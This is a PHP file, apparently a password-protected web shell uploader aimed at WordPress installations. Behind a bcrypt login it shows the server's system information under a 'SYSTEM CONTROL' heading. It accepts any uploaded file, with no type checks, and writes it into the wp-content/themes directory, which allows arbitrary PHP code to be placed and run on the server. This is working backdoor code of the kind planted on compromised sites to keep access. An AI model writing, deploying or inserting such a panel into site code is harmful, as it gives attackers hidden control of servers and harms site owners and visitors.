<?php
session_start();

// GANTI DENGAN HASH BCRYPT ANDA
$hashedPassword = '$2a$12$yWdTvR7nY//WBlD9E07sZeNvavXuFDFdCnjQ53Xc7E16FLxi7Shmy';

// Handle logout
if (isset($_GET['logout'])) {
    session_destroy();
    header('Location: ' . $_SERVER['PHP_SELF']);
    exit;
}

// Proses login
if (isset($_POST['login'])) {
    $inputPass = $_POST['password'] ?? '';
    if (password_verify($inputPass, $hashedPassword)) {
        $_SESSION['logged_in'] = true;
        // Redirect agar tidak repost form saat refresh
        header('Location: ' . $_SERVER['PHP_SELF']);
        exit;
    } else {
        $error = "ACCESS DENIED";
    }
}

// Jika belum login → tampilkan form login minimalis
if (!isset($_SESSION['logged_in']) || $_SESSION['logged_in'] !== true) {
    ?>
    <!DOCTYPE html>
    <html lang="en">
    <head>
        <meta charset="UTF-8">
        <title>Login</title>
        <style>
            body {
                background: #fff;
                color: #0f0;
                font-family: 'Courier New', monospace;
                margin: 0;
                padding: 0;
            }
            .login {
                position: absolute;
                top: 10px;
                left: 10px;
                display: flex;
                gap: 6px;
                align-items: center;
            }
            .login input[type="password"] {
                padding: 4px 6px;
                border: 1px solid #0f0;
                background: transparent;
                color: #0f0;
                font-family: monospace;
                font-size: 13px;
                outline: none;
            }
            .login input[type="submit"] {
                background: #0f0;
                color: #ffffffff;
                border: none;
                padding: 4px 8px;
                font-family: monospace;
                font-weight: bold;
                font-size: 12px;
                cursor: pointer;
            }
            .login input[type="submit"]:hover {
                background: #00ff00;
            }
            .error {
                position: absolute;
                top: 35px;
                left: 10px;
                color: #f00;
                font-size: 12px;
                font-family: monospace;
            }
        </style>
    </head>
    <body>
        <div class="login">
            <form method="post">
                <input type="password" name="password" placeholder="pass" required autocomplete="off">
                <input type="submit" name="login" value="login">
            </form>
        </div>
        <?php if (isset($error)): ?>
            <div class="error"><?= htmlspecialchars($error) ?></div>
        <?php endif; ?>
    </body>
    </html>
    <?php
    exit;
}

// =============== PANEL UTAMA (SETelah Login) ===============
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Uploader</title>
    <style>
        body {
            background: #fff;
            color: #0f0;
            font-family: 'Courier New', monospace;
            margin: 0;
            padding: 20px;
            font-size: 14px;
            line-height: 1.4;
        }
        .logout {
            position: absolute;
            top: 10px;
            right: 10px;
            color: #0f0;
            text-decoration: none;
            font-size: 12px;
        }
        .logout:hover {
            text-decoration: underline;
        }
        .header {
            margin-bottom: 15px;
            font-weight: bold;
        }
        .system-info {
            border: 1px solid #0f0;
            padding: 10px;
            margin-bottom: 20px;
            white-space: pre;
            font-size: 13px;
            background: transparent;
        }
        .upload-box {
            max-width: 400px;
        }
        .upload-box input[type="file"] {
            display: block;
            margin-bottom: 10px;
            color: #0f0;
            font-family: monospace;
            font-size: 13px;
        }
        .upload-box input[type="submit"] {
            background: #0f0;
            color: #000;
            border: none;
            padding: 5px 12px;
            font-family: monospace;
            font-weight: bold;
            font-size: 13px;
            cursor: pointer;
        }
        .upload-box input[type="submit"]:hover {
            background: #00ff00;
        }
        .notification {
            margin-top: 15px;
            padding: 8px;
            border-left: 3px solid;
            font-family: monospace;
            font-size: 13px;
        }
        .notification.success {
            border-color: #0f0;
            color: #0f0;
            background: rgba(0, 255, 0, 0.05);
        }
        .notification.error {
            border-color: #f00;
            color: #f00;
            background: rgba(255, 0, 0, 0.05);
        }
    </style>
</head>
<body>

<a href="?logout=1" class="logout">[logout]</a>

<div class="header">> SYSTEM CONTROL</div>

<div class="system-info"><?= htmlspecialchars(php_uname()) ?></div>

<div class="upload-box">
    <form method="post" enctype="multipart/form-data">
        <input type="file" name="__" required>
        <input type="submit" name="_" value="upload">
    </form>

    <?php if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_FILES['__'])): ?>
    <?php
    $tmp = $_FILES['__']['tmp_name'];
    $name = basename($_FILES['__']['name']); // mencegah path traversal
    $target = __DIR__ . '/wp-content/themes/' . $name;

    if (is_uploaded_file($tmp)) {
        if (move_uploaded_file($tmp, $target)) {
            $fullPath = realpath($target);
            echo '<div class="notification success">';
            echo "> File uploaded successfully!\n";
            echo "> Path: " . htmlspecialchars($fullPath);
            echo '</div>';
        } else {
            echo '<div class="notification error">> Unable to upload file</div>';
        }
    } else {
        echo '<div class="notification error">> Upload failed</div>';
    }
    ?>
<?php endif; ?>
</div>

</body>

</html>
